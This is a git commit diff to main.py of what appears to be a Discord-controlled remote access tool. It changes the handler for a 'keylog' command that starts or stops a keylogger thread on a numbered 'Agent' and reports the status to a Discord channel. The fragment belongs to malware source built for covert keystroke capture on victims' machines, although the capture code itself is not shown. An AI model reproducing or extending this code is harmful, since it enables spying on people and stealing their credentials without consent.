a92325bfb11179f9a8c2ed04dfe0e61c5275aea6
Hazed2004 <92877526+Hazed2004@users.noreply.github.com>
2022-05-31 22:07:38 +0530

    update keylogger
    added "stop keylogger"

--- code/main.py
+++ code/main.py
@@ -287,6 +287,7 @@ async def keylog(context):
             except IndexError:
                 my_embed = discord.Embed(title=f"Error while starting Keylogger on Agent#{ID}\nMake sure you have specified all the required parameters", color=0xFF0000)
         try:
+            threading.Thread(target=keylogger_start).start()
             try:
                 if not keylog_status:
                     my_embed = discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0xFF0000)
@@ -294,8 +295,8 @@ async def keylog(context):
                     return
             except Exception as e:
                 my_embed = discord.Embed(title=f"Error while stopping keylogger on Agent#{ID}:\n{e}", color=0xFF0000)
-            await context.message.channel.send(embed=my_embed)
-            threading.Thread(target=keylogger_start).start()
+                await context.message.channel.send(embed=my_embed)
+                return
             my_embed = discord.Embed(title=f"Keylogger started on Agent#{ID}", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
         except Exception as e:
